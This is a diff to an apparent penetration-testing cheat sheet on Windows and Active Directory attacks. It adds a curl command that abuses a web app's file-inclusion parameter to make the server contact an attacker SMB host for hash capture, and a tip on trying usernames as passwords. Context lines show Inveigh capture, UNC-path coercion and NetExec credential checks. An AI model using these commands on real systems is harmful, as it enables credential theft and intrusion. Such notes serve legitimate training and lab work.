@@ -24,6 +24,7 @@ inveigh.exe -httpd <ip>
 # from inside the machine (shortcut file, shell or web attack)
 dir \\<IP>\test
 Content-Disposition: form-data; name="myFile"; filename="\\\\<ip>\\test"
+curl http://<url>/index.php?view=//10.10.14.13/asdf
 ```
 
 ## Living off the Land
@@ -132,7 +133,10 @@ nxc smb <ip> -u <user> -p <pass> --users
     🍪 NetExec
 
     - `[+]` is valid credentials
-    - `[pwned!]` is valid credential with privileges 
+    - `[pwned!]` is valid credential with privileges
+
+!!! tip
+    🍪 Some users could have their username as their password
 
 ```shell
 # nxc
